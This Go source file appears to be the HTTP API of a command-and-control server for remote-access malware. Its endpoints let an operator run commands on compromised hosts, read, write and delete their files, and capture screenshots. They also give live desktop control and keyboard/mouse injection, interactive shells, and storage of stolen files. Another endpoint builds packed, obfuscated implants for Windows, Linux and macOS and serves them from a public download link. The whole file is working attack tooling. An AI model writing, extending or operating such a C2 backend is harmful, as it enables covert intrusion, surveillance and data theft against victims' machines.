package api

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"path/filepath"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"time"

	"c2-platform/internal/auth"
	"c2-platform/internal/config"
	"c2-platform/internal/listener"
	"c2-platform/internal/payload"
	"c2-platform/internal/session"
	"c2-platform/internal/shots"
	"c2-platform/internal/stash"
	"c2-platform/internal/xfer"

	"github.com/gorilla/websocket"
)

type Server struct {
	cfg       *config.Config
	hub       *session.Hub
	lm        *listener.Manager
	au        *auth.Service
	ui        http.Handler
	payloadMu sync.Mutex
	store     *payload.Store
	stash     *stash.Store
	shots     *shots.Store
	xf        *xfer.Manager
}

func New(cfg *config.Config, hub *session.Hub, lm *listener.Manager, ui http.Handler) http.Handler {
	s := &Server{
		cfg:   cfg,
		hub:   hub,
		lm:    lm,
		au:    auth.New(cfg.Username, cfg.Password, cfg.JWTSecret),
		ui:    ui,
		store: payload.NewStore("data/payloads"),
		stash: stash.New("data/stash"),
		shots: shots.New("data/shots"),
	}
	s.xf = xfer.New(hub, s.stash, "data/xfer")
	mux := http.NewServeMux()
	mux.HandleFunc("POST /api/login", s.login)
	mux.HandleFunc("GET /api/me", s.auth(s.me))
	mux.HandleFunc("GET /api/listeners", s.auth(s.listListeners))
	mux.HandleFunc("POST /api/listeners", s.auth(s.createListener))
	mux.HandleFunc("DELETE /api/listeners/{id}", s.auth(s.deleteListener))
	mux.HandleFunc("GET /api/sessions", s.auth(s.listSessions))
	mux.HandleFunc("GET /api/sessions/{id}", s.auth(s.getSession))
	mux.HandleFunc("PATCH /api/sessions/{id}", s.auth(s.patchSession))
	mux.HandleFunc("POST /api/sessions/{id}/quit", s.auth(s.quitSession))
	mux.HandleFunc("DELETE /api/sessions/{id}", s.auth(s.deleteSession))
	mux.HandleFunc("POST /api/sessions/{id}/exec", s.auth(s.exec))
	mux.HandleFunc("POST /api/sessions/{id}/fs/ls", s.auth(s.fsLs))
	mux.HandleFunc("POST /api/sessions/{id}/fs/get", s.auth(s.fsGet))
	mux.HandleFunc("POST /api/sessions/{id}/fs/put", s.auth(s.fsPut))
	mux.HandleFunc("GET /api/sessions/{id}/xfers", s.auth(s.xferList))
	mux.HandleFunc("POST /api/sessions/{id}/xfers", s.auth(s.xferStart))
	mux.HandleFunc("POST /api/sessions/{id}/xfers/clear", s.auth(s.xferClear))
	mux.HandleFunc("POST /api/sessions/{id}/xfers/{jid}/pause", s.auth(s.xferPause))
	mux.HandleFunc("POST /api/sessions/{id}/xfers/{jid}/resume", s.auth(s.xferResume))
	mux.HandleFunc("POST /api/sessions/{id}/xfers/{jid}/cancel", s.auth(s.xferCancel))
	mux.HandleFunc("POST /api/sessions/{id}/xfers/{jid}/chunk", s.auth(s.xferChunk))
	mux.HandleFunc("GET /api/sessions/{id}/xfers/{jid}/file", s.auth(s.xferFile))
	mux.HandleFunc("POST /api/sessions/{id}/fs/del", s.auth(s.fsDel))
	mux.HandleFunc("POST /api/sessions/{id}/fs/mkdir", s.auth(s.fsMkdir))
	mux.HandleFunc("POST /api/sessions/{id}/fs/ren", s.auth(s.fsRen))
	mux.HandleFunc("POST /api/sessions/{id}/screen", s.auth(s.screen))
	mux.HandleFunc("POST /api/sessions/{id}/desktop", s.auth(s.desktop))
	mux.HandleFunc("POST /api/sessions/{id}/input", s.auth(s.input))
	mux.HandleFunc("POST /api/sessions/{id}/shell", s.auth(s.shell))
	mux.HandleFunc("POST /api/sessions/{id}/shell/in", s.auth(s.shellIn))
	mux.HandleFunc("GET /api/sessions/{id}/tasks/{tid}", s.auth(s.getTask))
	mux.HandleFunc("GET /api/sessions/{id}/tasks/{tid}/download", s.auth(s.downloadTask))
	mux.HandleFunc("GET /api/sessions/{id}/stash", s.auth(s.stashList))
	mux.HandleFunc("POST /api/sessions/{id}/stash", s.auth(s.stashImport))
	mux.HandleFunc("GET /api/sessions/{id}/stash/{fid}", s.auth(s.stashFile))
	mux.HandleFunc("DELETE /api/sessions/{id}/stash/{fid}", s.auth(s.stashDelete))
	mux.HandleFunc("GET /api/sessions/{id}/shots", s.auth(s.shotList))
	mux.HandleFunc("POST /api/sessions/{id}/shots", s.auth(s.shotAdd))
	mux.HandleFunc("PATCH /api/sessions/{id}/shots/{fid}", s.auth(s.shotRemark))
	mux.HandleFunc("GET /api/sessions/{id}/shots/{fid}", s.auth(s.shotFile))
	mux.HandleFunc("DELETE /api/sessions/{id}/shots/{fid}", s.auth(s.shotDelete))
	mux.HandleFunc("GET /p/{token}", s.payloadPublic)
	mux.HandleFunc("GET /api/payloads", s.auth(s.payloadMeta))
	mux.HandleFunc("GET /api/payloads/history", s.auth(s.payloadHistory))
	mux.HandleFunc("GET /api/payloads/{id}/file", s.auth(s.payloadFile))
	mux.HandleFunc("DELETE /api/payloads/{id}", s.auth(s.payloadDelete))
	mux.HandleFunc("POST /api/payloads", s.auth(s.createPayload))
	mux.HandleFunc("GET /api/ws", s.ws)
	if ui != nil {
		mux.Handle("/", ui)
	}
	return recoverHandler(mux)
}

func recoverHandler(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if rec := recover(); rec != nil {
				log.Printf("http panic %s: %v\n%s", r.URL.Path, rec, debug.Stack())
				http.Error(w, `{"code":500,"message":"internal error"}`, 500)
			}
		}()
		next.ServeHTTP(w, r)
	})
}

type apiErr struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

func writeJSON(w http.ResponseWriter, status int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(v)
}

func writeErr(w http.ResponseWriter, status int, msg string) {
	writeJSON(w, status, apiErr{Code: status, Message: msg})
}

func contentDisposition(name string) string {
	name = strings.TrimSpace(strings.ReplaceAll(strings.ReplaceAll(name, `"`, "_"), "\n", ""))
	if name == "" {
		name = "download"
	}
	ascii := "download"
	if i := strings.LastIndex(name, "."); i >= 0 && i < len(name)-1 {
		ext := name[i:]
		ok := true
		for _, c := range ext {
			if c < 32 || c > 126 {
				ok = false
				break
			}
		}
		if ok {
			ascii = "download" + ext
		}
	}
	allASCII := true
	for _, c := range name {
		if c < 32 || c > 126 || c == ';' {
			allASCII = false
			break
		}
	}
	if allASCII {
		ascii = name
	}
	return fmt.Sprintf(`attachment; filename="%s"; filename*=UTF-8''%s`, ascii, url.PathEscape(name))
}

func (s *Server) login(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeErr(w, 422, "invalid json")
		return
	}
	tok, err := s.au.Login(body.Username, body.Password)
	if err != nil {
		writeErr(w, 401, "unauthorized")
		return
	}
	writeJSON(w, 200, map[string]string{"token": tok})
}

func (s *Server) tokenFrom(r *http.Request) string {
	h := r.Header.Get("Authorization")
	if strings.HasPrefix(h, "Bearer ") {
		return strings.TrimPrefix(h, "Bearer ")
	}
	return r.URL.Query().Get("token")
}

func (s *Server) auth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if _, err := s.au.Parse(s.tokenFrom(r)); err != nil {
			writeErr(w, 401, "unauthorized")
			return
		}
		next(w, r)
	}
}

func (s *Server) me(w http.ResponseWriter, r *http.Request) {
	u, _ := s.au.Parse(s.tokenFrom(r))
	writeJSON(w, 200, map[string]string{"username": u, "title": s.cfg.WebTitle})
}

func (s *Server) listListeners(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, s.lm.List())
}

func (s *Server) createListener(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Name string `json:"name"`
		Bind string `json:"bind"`
		Port int    `json:"port"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeErr(w, 422, "invalid json")
		return
	}
	spec, err := s.lm.Start(listener.Spec{Name: body.Name, Bind: body.Bind, Port: body.Port})
	if err != nil {
		if errors.Is(err, listener.ErrInUse) {
			writeErr(w, 409, "端口已被占用")
			return
		}
		writeErr(w, 422, err.Error())
		return
	}
	writeJSON(w, 200, spec)
}

func (s *Server) deleteListener(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if err := s.lm.Stop(id); err != nil {
		writeErr(w, 404, "not found")
		return
	}
	writeJSON(w, 200, map[string]string{"ok": "1"})
}

type sessionDTO struct {
	ID         string `json:"id"`
	ListenerID string `json:"listener_id"`
	RemoteAddr string `json:"remote_addr"`
	Hostname   string `json:"hostname"`
	Username   string `json:"username"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	PID        uint32 `json:"pid"`
	IP         string `json:"ip"`
	Remark     string `json:"remark"`
	LastSeen   int64  `json:"last_seen"`
	Status     string `json:"status"`
}

func toDTO(s session.Session) sessionDTO {
	return sessionDTO{
		ID:         s.ID,
		ListenerID: s.ListenerID,
		RemoteAddr: s.RemoteAddr,
		Hostname:   s.Reg.Hostname,
		Username:   s.Reg.Username,
		OS:         s.Reg.OS,
		Arch:       s.Reg.Arch,
		PID:        s.Reg.PID,
		IP:         s.Reg.IP,
		Remark:     s.Remark,
		LastSeen:   s.LastSeen.Unix(),
		Status:     string(s.Status),
	}
}

func (s *Server) listSessions(w http.ResponseWriter, r *http.Request) {
	list := s.hub.List()
	out := make([]sessionDTO, 0, len(list))
	for _, x := range list {
		out = append(out, toDTO(x))
	}
	writeJSON(w, 200, out)
}

func (s *Server) getSession(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	got := s.hub.Get(id)
	if got == nil {
		writeErr(w, 404, "not found")
		return
	}
	writeJSON(w, 200, toDTO(*got))
}

func (s *Server) exec(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Cmd string `json:"cmd"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Cmd) == "" {
		writeErr(w, 422, "cmd required")
		return
	}
	s.enqueueKind(w, id, session.TaskExec, body.Cmd)
}

func (s *Server) enqueueKind(w http.ResponseWriter, id string, kind session.TaskKind, arg string) {
	tid, err := s.hub.Enqueue(id, kind, arg)
	if err != nil {
		if errors.Is(err, session.ErrNoSession) {
			writeErr(w, 404, "not found")
			return
		}
		writeErr(w, 409, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"task_id": tid})
}

func (s *Server) fsLs(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Path string `json:"path"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)
	s.enqueueKind(w, id, session.TaskFsLs, body.Path)
}

func (s *Server) fsGet(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Path) == "" {
		writeErr(w, 422, "path required")
		return
	}
	s.enqueueKind(w, id, session.TaskFsGet, body.Path)
}

func (s *Server) fsPut(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Path string `json:"path"`
		Data string `json:"data"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Path) == "" {
		writeErr(w, 422, "path required")
		return
	}
	raw, err := base64.StdEncoding.DecodeString(body.Data)
	if err != nil {
		writeErr(w, 422, "invalid data")
		return
	}
	tid, err := s.hub.PutFile(id, body.Path, raw)
	if err != nil {
		if errors.Is(err, session.ErrNoSession) {
			writeErr(w, 404, "not found")
			return
		}
		writeErr(w, 409, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"task_id": tid})
}

func (s *Server) fsDel(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Path) == "" {
		writeErr(w, 422, "path required")
		return
	}
	s.enqueueKind(w, id, session.TaskFsDel, body.Path)
}

func (s *Server) fsMkdir(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Path) == "" {
		writeErr(w, 422, "path required")
		return
	}
	s.enqueueKind(w, id, session.TaskFsMkdir, body.Path)
}

func (s *Server) fsRen(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		From string `json:"from"`
		To   string `json:"to"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.From) == "" || strings.TrimSpace(body.To) == "" {
		writeErr(w, 422, "from and to required")
		return
	}
	s.enqueueKind(w, id, session.TaskFsRen, body.From+"\n"+body.To)
}

func (s *Server) patchSession(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Remark *string `json:"remark"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Remark == nil {
		writeErr(w, 422, "remark required")
		return
	}
	if err := s.hub.SetRemark(id, *body.Remark); err != nil {
		writeErr(w, 404, err.Error())
		return
	}
	ss := s.hub.Get(id)
	if ss == nil {
		writeErr(w, 404, "not found")
		return
	}
	writeJSON(w, 200, toDTO(*ss))
}

func (s *Server) quitSession(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if err := s.hub.Quit(id); err != nil {
		if errors.Is(err, session.ErrNoSession) {
			writeErr(w, 404, err.Error())
			return
		}
		writeErr(w, 409, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"ok": "1"})
}

func (s *Server) deleteSession(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	_ = s.hub.Quit(id)
	s.hub.Detach(id)
	if s.stash != nil {
		_ = s.stash.DeleteSession(id)
	}
	if s.shots != nil {
		_ = s.shots.DeleteSession(id)
	}
	writeJSON(w, 200, map[string]string{"ok": "1"})
}

func (s *Server) screen(w http.ResponseWriter, r *http.Request) {
	s.enqueueKind(w, r.PathValue("id"), session.TaskScreen, "")
}

func (s *Server) desktop(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Action  string `json:"action"`
		Width   int    `json:"width"`
		Quality int    `json:"quality"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)
	switch strings.ToLower(strings.TrimSpace(body.Action)) {
	case "stop":
		if err := s.hub.StopDesktop(id); err != nil {
			if errors.Is(err, session.ErrNoSession) {
				writeErr(w, 404, "not found")
				return
			}
			writeErr(w, 409, err.Error())
			return
		}
		writeJSON(w, 200, map[string]string{"ok": "1"})
	default:
		if err := s.hub.StartDesktop(id, body.Width, body.Quality); err != nil {
			if errors.Is(err, session.ErrNoSession) {
				writeErr(w, 404, "not found")
				return
			}
			writeErr(w, 409, err.Error())
			return
		}
		writeJSON(w, 200, map[string]string{"ok": "1"})
	}
}

func (s *Server) input(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Kind byte   `json:"kind"`
		X    int32  `json:"x"`
		Y    int32  `json:"y"`
		Code uint16 `json:"code"`
		Down bool   `json:"down"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Kind == 0 {
		writeErr(w, 422, "invalid input")
		return
	}
	if err := s.hub.SendInput(id, session.EncodeInput(body.Kind, body.X, body.Y, body.Code, body.Down)); err != nil {
		if errors.Is(err, session.ErrNoSession) {
			writeErr(w, 404, "not found")
			return
		}
		writeErr(w, 409, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"ok": "1"})
}

func (s *Server) shell(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Action string `json:"action"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)
	switch strings.ToLower(strings.TrimSpace(body.Action)) {
	case "stop":
		if err := s.hub.StopShell(id); err != nil {
			if errors.Is(err, session.ErrNoSession) {
				writeErr(w, 404, "not found")
				return
			}
			writeErr(w, 409, err.Error())
			return
		}
		writeJSON(w, 200, map[string]string{"ok": "1"})
	default:
		if err := s.hub.StartShell(id); err != nil {
			if errors.Is(err, session.ErrNoSession) {
				writeErr(w, 404, "not found")
				return
			}
			writeErr(w, 409, err.Error())
			return
		}
		writeJSON(w, 200, map[string]string{"ok": "1"})
	}
}

func (s *Server) shellIn(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Data string `json:"data"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeErr(w, 422, "invalid json")
		return
	}
	if err := s.hub.SendShell(id, []byte(body.Data)); err != nil {
		if errors.Is(err, session.ErrNoSession) {
			writeErr(w, 404, "not found")
			return
		}
		writeErr(w, 409, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"ok": "1"})
}

func (s *Server) payloadHistory(w http.ResponseWriter, r *http.Request) {
	if s.store == nil {
		writeJSON(w, 200, []payload.Record{})
		return
	}
	writeJSON(w, 200, s.store.List())
}

func (s *Server) payloadFile(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if s.store == nil {
		writeErr(w, 404, "not found")
		return
	}
	rec, b, err := s.store.File(id)
	if err != nil {
		writeErr(w, 404, "not found")
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", contentDisposition(rec.Filename))
	w.Header().Set("Content-Length", strconv.Itoa(len(b)))
	w.WriteHeader(200)
	_, _ = w.Write(b)
}

func (s *Server) payloadDelete(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if s.store == nil {
		writeErr(w, 404, "not found")
		return
	}
	if err := s.store.Delete(id); err != nil {
		writeErr(w, 404, "not found")
		return
	}
	writeJSON(w, 200, map[string]string{"ok": "1"})
}

func (s *Server) payloadMeta(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, payload.Status())
}

func (s *Server) createPayload(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Host       string   `json:"host"`
		Port       int      `json:"port"`
		Filename   string   `json:"filename"`
		Target     string   `json:"target"`
		Language   string   `json:"language"`
		Pack       bool     `json:"pack"`
		Obfuscate  bool     `json:"obfuscate"`
		Techniques []string `json:"techniques"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeErr(w, 422, "invalid json")
		return
	}
	req, err := payload.Validate(payload.Request{Host: body.Host, Port: body.Port, Filename: body.Filename, Target: body.Target, Language: body.Language, Pack: body.Pack, Obfuscate: body.Obfuscate, Techniques: body.Techniques})
	if err != nil {
		writeErr(w, 422, err.Error())
		return
	}
	s.payloadMu.Lock()
	defer s.payloadMu.Unlock()
	ctx, cancel := context.WithTimeout(r.Context(), 180*time.Second)
	defer cancel()
	res, err := payload.Build(ctx, req)
	if err != nil {
		if errors.Is(err, payload.ErrNoCompiler) {
			writeErr(w, 503, "未找到交叉编译器")
			return
		}
		if errors.Is(err, payload.ErrInvalid) {
			writeErr(w, 422, err.Error())
			return
		}
		writeErr(w, 500, err.Error())
		return
	}
	osName, arch := "windows", "amd64"
	switch req.Target {
	case "linux-amd64":
		osName, arch = "linux", "amd64"
	case "linux-arm64":
		osName, arch = "linux", "arm64"
	case "darwin-arm64":
		osName, arch = "darwin", "arm64"
	case "darwin-amd64":
		osName, arch = "darwin", "amd64"
	}
	rec := payload.Record{
		Name: strings.TrimSpace(body.Filename), Host: res.Host, Port: res.Port,
		Filename: res.Filename, Target: req.Target, OS: osName, Arch: arch, Format: payload.FormatOf(req.Target), Language: req.Language,
		Techniques: res.Techniques,
	}
	if rec.Name == "" {
		rec.Name = res.Filename
	}
	if s.store != nil {
		saved, err := s.store.Put(rec, res.Bytes)
		if err == nil {
			rec = saved
		}
	}
	if r.URL.Query().Get("download") == "1" {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", contentDisposition(res.Filename))
		w.Header().Set("Content-Length", strconv.Itoa(len(res.Bytes)))
		w.WriteHeader(200)
		_, _ = w.Write(res.Bytes)
		return
	}
	writeJSON(w, 200, rec)
}

func (s *Server) payloadPublic(w http.ResponseWriter, r *http.Request) {
	if s.store == nil {
		writeErr(w, 404, "not found")
		return
	}
	it, b, err := s.store.FileByToken(r.PathValue("token"))
	if err != nil {
		writeErr(w, 404, "not found")
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", contentDisposition(it.Filename))
	w.Header().Set("Content-Length", strconv.Itoa(len(b)))
	w.WriteHeader(200)
	_, _ = w.Write(b)
}

func (s *Server) getTask(w http.ResponseWriter, r *http.Request) {
	tid := r.PathValue("tid")
	t := s.hub.GetTask(tid)
	if t == nil {
		writeErr(w, 404, "not found")
		return
	}
	dto := map[string]any{
		"id":         t.ID,
		"session_id": t.SessionID,
		"kind":       t.Kind,
		"cmd":        t.Cmd,
		"done":       t.Done,
		"error":      t.Err,
		"size":       len(t.Output),
	}
	if t.Kind == session.TaskExec || t.Kind == session.TaskFsLs {
		dto["output"] = string(t.Output)
	}
	writeJSON(w, 200, dto)
}

func (s *Server) shotList(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if s.shots == nil {
		writeJSON(w, 200, []shots.Item{})
		return
	}
	writeJSON(w, 200, s.shots.List(id))
}

func (s *Server) shotAdd(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		Data   string `json:"data"`
		Remark string `json:"remark"`
		W      int    `json:"w"`
		H      int    `json:"h"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Data) == "" {
		writeErr(w, 422, "data required")
		return
	}
	raw, err := base64.StdEncoding.DecodeString(body.Data)
	if err != nil || len(raw) < 10 {
		writeErr(w, 422, "bad image")
		return
	}
	if s.shots == nil {
		writeErr(w, 500, "shots unavailable")
		return
	}
	it, err := s.shots.Put(id, body.Remark, body.W, body.H, raw)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, it)
}

func (s *Server) shotRemark(w http.ResponseWriter, r *http.Request) {
	fid := r.PathValue("fid")
	var body struct {
		Remark string `json:"remark"`
	}
	_ = json.NewDecoder(r.Body).Decode(&body)
	if s.shots == nil {
		writeErr(w, 404, "not found")
		return
	}
	if err := s.shots.SetRemark(fid, body.Remark); err != nil {
		writeErr(w, 404, "not found")
		return
	}
	writeJSON(w, 200, map[string]string{"ok": "1"})
}

func (s *Server) shotFile(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	fid := r.PathValue("fid")
	if s.shots == nil {
		writeErr(w, 404, "not found")
		return
	}
	it, b, err := s.shots.File(fid)
	if err != nil || it.SessionID != id {
		writeErr(w, 404, "not found")
		return
	}
	w.Header().Set("Content-Type", "image/jpeg")
	w.Header().Set("Content-Length", strconv.Itoa(len(b)))
	w.WriteHeader(200)
	_, _ = w.Write(b)
}

func (s *Server) shotDelete(w http.ResponseWriter, r *http.Request) {
	fid := r.PathValue("fid")
	if s.shots == nil {
		writeErr(w, 404, "not found")
		return
	}
	if err := s.shots.Delete(fid); err != nil {
		writeErr(w, 404, "not found")
		return
	}
	writeJSON(w, 200, map[string]string{"ok": "1"})
}

func (s *Server) stashList(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if s.stash == nil {
		writeJSON(w, 200, []stash.Item{})
		return
	}
	writeJSON(w, 200, s.stash.List(id))
}

func (s *Server) stashImport(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		TaskID string `json:"task_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.TaskID) == "" {
		writeErr(w, 422, "task_id required")
		return
	}
	t := s.hub.GetTask(body.TaskID)
	if t == nil || t.SessionID != id {
		writeErr(w, 404, "task not found")
		return
	}
	if !t.Done {
		writeErr(w, 409, "not ready")
		return
	}
	if t.Err != "" {
		writeErr(w, 500, t.Err)
		return
	}
	name := strings.ReplaceAll(t.Cmd, `\`, "/")
	name = filepath.Base(name)
	if name == "." || name == "/" || name == "" {
		name = body.TaskID
	}
	if s.stash == nil {
		writeErr(w, 500, "stash unavailable")
		return
	}
	it, err := s.stash.Put(id, name, t.Cmd, t.Output)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, it)
}

func (s *Server) stashFile(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	fid := r.PathValue("fid")
	if s.stash == nil {
		writeErr(w, 404, "not found")
		return
	}
	it, b, err := s.stash.File(fid)
	if err != nil || it.SessionID != id {
		writeErr(w, 404, "not found")
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", contentDisposition(it.Name))
	w.Header().Set("Content-Length", strconv.Itoa(len(b)))
	w.WriteHeader(200)
	_, _ = w.Write(b)
}

func (s *Server) stashDelete(w http.ResponseWriter, r *http.Request) {
	fid := r.PathValue("fid")
	if s.stash == nil {
		writeErr(w, 404, "not found")
		return
	}
	if err := s.stash.Delete(fid); err != nil {
		writeErr(w, 404, "not found")
		return
	}
	writeJSON(w, 200, map[string]string{"ok": "1"})
}

func (s *Server) downloadTask(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	tid := r.PathValue("tid")
	t := s.hub.GetTask(tid)
	if t == nil || t.SessionID != id {
		writeErr(w, 404, "not found")
		return
	}
	if !t.Done {
		writeErr(w, 409, "not ready")
		return
	}
	if t.Err != "" {
		writeErr(w, 500, t.Err)
		return
	}
	name := filepath.Base(t.Cmd)
	if name == "." || name == "/" || name == "" {
		if t.Kind == session.TaskScreen || t.Kind == session.TaskDesktop {
			name = "screen.jpg"
		} else {
			name = tid
		}
	}
	ctype := "application/octet-stream"
	body := t.Output
	if t.Kind == session.TaskScreen || t.Kind == session.TaskDesktop {
		ctype = "image/jpeg"
		if len(body) >= 4 {
			body = body[4:]
		}
		if !strings.HasSuffix(strings.ToLower(name), ".jpg") {
			name += ".jpg"
		}
	}
	w.Header().Set("Content-Type", ctype)
	w.Header().Set("Content-Disposition", contentDisposition(name))
	w.Header().Set("Content-Length", strconv.Itoa(len(body)))
	w.WriteHeader(200)
	_, _ = w.Write(body)
}

var upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}

func (s *Server) ws(w http.ResponseWriter, r *http.Request) {
	if _, err := s.au.Parse(s.tokenFrom(r)); err != nil {
		writeErr(w, 401, "unauthorized")
		return
	}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()
	ch := s.hub.Subscribe()
	defer s.hub.Unsubscribe(ch)
	conn.SetReadLimit(1 << 20)
	go func() {
		for {
			if _, _, err := conn.NextReader(); err != nil {
				_ = conn.Close()
				return
			}
		}
	}()
	for ev := range ch {
		if err := conn.WriteJSON(ev); err != nil {
			return
		}
	}
}
